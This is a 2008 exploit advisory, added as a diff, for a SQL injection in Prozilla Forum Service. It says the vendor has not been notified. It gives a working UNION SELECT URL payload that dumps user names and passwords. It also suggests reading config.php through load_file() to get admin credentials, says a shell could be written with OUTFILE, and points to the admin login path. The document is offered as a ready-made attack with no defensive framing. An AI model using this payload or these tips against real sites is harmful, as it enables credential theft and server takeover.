@@ -1,0 +1,41 @@
+--==+================================================================================+==--
+--==+		    Prozilla Forum Service SQL Injection Vulnerbilitys	             +==--
+--==+================================================================================+==--
+
+
+
+Discovered By: t0pP8uZz
+Discovered On: 7 April 2008
+Script Download: http://prozilla.com
+DORK: N/A
+Vendor Has Not Been Notified!
+
+
+
+DESCRIPTION: 
+Prozilla Forum Service is vulnerable due to a insecure mysql query, this allows the remote attacker
+to pull user credentials from the database, and possibly load a shell using OUTFILE. and 
+even read local files using load_file()
+
+
+
+SQL Injection:
+http://site.com/forum.php?forum=-1/**/UNION/**/ALL/**/SELECT/**/1,CONCAT(name,0x3a,password),3,4/**/FROM/**/users/*
+
+
+
+NOTE/TIP: 
+admin login is at /siteadmin/
+admin login can be found in config.php which can be viewed by using load_file().
+
+
+
+GREETZ: milw0rm.com, h4ck-y0u.org, CipherCrew !
+
+
+
+--==+================================================================================+==--
+--==+		    Prozilla Forum Service SQL Injection Vulnerbilitys	             +==--
+--==+================================================================================+==--
+
+# milw0rm.com [2008-04-06]
